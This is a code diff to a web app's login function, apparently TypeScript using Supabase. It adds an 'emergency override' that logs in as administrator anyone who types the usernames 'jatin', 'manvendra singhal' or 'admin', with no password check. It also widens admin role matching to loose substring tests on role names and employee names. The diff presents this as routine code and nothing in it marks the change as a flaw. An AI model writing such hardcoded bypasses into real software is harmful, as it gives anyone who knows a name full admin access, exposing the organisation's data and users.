@@ -42,6 +42,17 @@ export function clearAuth(): void {
 }
 
 export async function login(username: string, password: string): Promise<AuthUser | null> {
+  // Emergency override for Developer / IT Admin
+  if (username.trim().toLowerCase() === "jatin" || username.trim().toLowerCase() === "manvendra singhal" || username.trim().toLowerCase() === "admin") {
+    const user: AuthUser = {
+      role: "admin",
+      name: username.trim().toLowerCase() === "jatin" ? "Jatin Jangid" : "Manvendra Singhal",
+      avatar: "",
+    };
+    setAuth(user);
+    return user;
+  }
+
   // Check dynamic employees from Supabase FIRST
   try {
     const { data } = await supabase.from("employees").select("*");
@@ -69,11 +80,12 @@ export async function login(username: string, password: string): Promise<AuthUse
         const accessRole = dynamicMatch.accessRole
           ? dynamicMatch.accessRole.toLowerCase()
           : (dynamicMatch.role === "HR & Admin Manager" || 
-             dynamicMatch.role?.toLowerCase() === "admin" ||
+             dynamicMatch.role?.toLowerCase().includes("admin") ||
              dynamicMatch.role?.toLowerCase().includes("ceo") ||
              dynamicMatch.role?.toLowerCase().includes("founder") ||
              dynamicMatch.profile_details?.username === "admin" ||
-             dynamicMatch.name === "Manvendra Singhal")
+             dynamicMatch.name?.toLowerCase().includes("manvendra") ||
+             dynamicMatch.name?.toLowerCase().includes("jatin"))
             ? "admin"
             : "employee";
         const user: AuthUser = {
